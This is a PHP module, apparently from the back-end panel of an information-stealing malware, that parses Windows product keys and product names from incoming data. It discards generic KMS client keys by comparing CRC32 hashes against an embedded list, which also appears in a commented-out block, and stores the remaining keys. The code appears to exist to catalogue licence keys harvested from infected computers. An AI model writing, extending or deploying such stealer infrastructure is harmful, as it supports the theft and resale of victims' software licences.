<?php
class Module_winkey extends Module_
{

	/*$KMSList = 'W269N-WFGWX-YVC9B-4J6C9-T83GX|MH37W-N47XK-V7XM9-C7227-GCQG9|NPPR9-FWDCX-D2C8J-H872K-2YT43|DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4|NW6C2-QMPVW-D7KKK-3GKT6-VCFB2|2WH4N-8QGBV-H22JP-CT43Q-MDWWJ|WNMTR-4C88C-JK8YV-HQ7T2-76DF9|2F77B-TNFGY-69QQF-B8YKP-D69TJ|GCRJD-8NW9H-F2CDX-CCM8D-9D6T9|HMCNV-VVBFX-7HMBH-CTY9B-B4FXY|MHF9N-XY6XB-WVXMC-BTDCT-MKKG7|TT4HM-HN7YT-62K67-RGRQJ-JFFXW|D2N9P-3P6X9-2R39C-7RTCD-MDVJX|W3GGN-FT8W3-Y4M27-J84CP-Q3VJ9|KNC87-3J2TX-XB4WP-VCPJV-M4FWM|NG4HW-VH26C-733KW-K6F98-J8CK4|XCVCF-2NXM9-723PB-MHCB7-2RYQQ|32JNW-9KQ84-P47T8-D8GGY-CWCK7|JMNMF-RHW7P-DMY6X-RF3DR-X2BQT|BN3D2-R7TKB-3YPBD-8DRP2-27GG4|8N2M2-HWPGY-7PGT9-HGDD8-GVGGY|2WN2H-YGCQR-KFX6K-CD6TF-84YXQ|4K36P-JN4VD-GDC6V-KDT89-DYFKP|XC9B7-NBPP2-83J2H-RHMBY-92BT4|HM7DN-YVMH3-46JC3-XYTG7-CYQJJ|XNH6W-2V9GX-RGJ4K-Y8X6F-QGJ2G|48HP8-DN98B-MYWDG-T2DCC-8W83P|FJ82H-XT6CR-J8D7P-XQJJ2-GPDD4|MRPKT-YTG23-K7D7T-X2JMM-QY7MG|W82YF-2Q76Y-63HXB-FGJG9-GF7QX|33PXH-7Y6KF-2VJC9-XBBR8-HVTHH|YDRBP-3D83W-TY26F-D46B2-XCKRJ|C29WB-22CC8-VJ326-GHFJW-H9DH4|6TPJF-RBVHG-WBW2R-86QPH-6RTM4|TT8MH-CG224-D3D7Q-498W2-9QCTX|YC6KT-GKW9T-YTKYR-T4X34-R7VHC|489J6-VHDMP-X63PK-3K798-CPX3Y|74YFP-3QFB3-KQT8W-PMXWJ-7M648|GT63C-RJFQ3-4GMB6-BRFB9-CB83V|YFKBB-PQJJV-G996G-VWGXY-2V3X8|HMBQG-8H2RH-C77VX-27R82-VMQBT|VKK3X-68KWM-X2YGT-QR4M6-4BWMV|VTC42-BM838-43QHV-84HX6-XJXKV|WYR28-R7TFJ-3X2YQ-YCY4H-M249D|TM24T-X9RMF-VWXK6-X8JC9-BFGM2|W7VD6-7JFBR-RX26B-YKQ3Y-6FFFJ|YQGMW-MPWTJ-34KDK-48M3W-X4Q6V|39BXF-X8Q23-P2WWT-38T2F-G3FPG|RCTX3-KWVHP-BR6TB-RB6DM-6X7HP|7M67G-PC374-GR742-YH8V4-TCBY3|22XQ2-VRXRG-P8D42-K34TD-G3QQC|4DWFP-JF3DJ-B7DTH-78FJB-PDRHK';
	$Data_ = explode("|", $KMSList);
	$Data_ = array_map('trim', $Data_);
	$Data_ = array_map('crc32', $Data_);
	'$KMSDb = array(' . implode(", ", $Data_) . ');';*/
	
    public function process_module($Data, $Version)
    {
		$KMSDb = array(270829055, -1986148013, 36861452, 1598466045, -2095890660, 1921209912, 219421772, 1376831331, 1985471443, -833793554, 727603796, -2011669802, 696394322, 120272190, -293392869, 1277948566, -1988844818, 166921822, -560054741, 847282246, 1943630946, -1414362981, -724924252, -781941473, 1366639159, -1944332504, -570930021, 804786758, 929205978, -1295898943, 2096675128, -1456906029, -1221419917, -1419261528, 734182305, 368350185, -250447306, 1037954845, 770121372, -1264895911, 2020343244, 204027266, -1054400130, -521837600, 201073078, 58133912, -28260396, -1880092151, 1113374345, 1606656924, 497956075, -2136140399);
	
        switch ($Version)
        {
        case 0:

            $wStream = new Stream($Data, strlen($Data));
            if($wStream)
            {
                $Key = $wStream->getSTRING_();
                if($Key != NULL)
                {
					$CRC_ = crc32(trim($Key));
					if (!in_array($CRC_, $KMSDb)) 
					{
						$Product = $wStream->getSTRING_();
						$this->insert_other($Key. ", " . $Product);
					}
					else
					{
						if(DEBUG_)
						{
							$Product = $wStream->getSTRING_();
							$this->insert_other("KMS-" . $Key. ", " . $Product);
						}
					}

                }
                $wStream = NULL;
            }
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
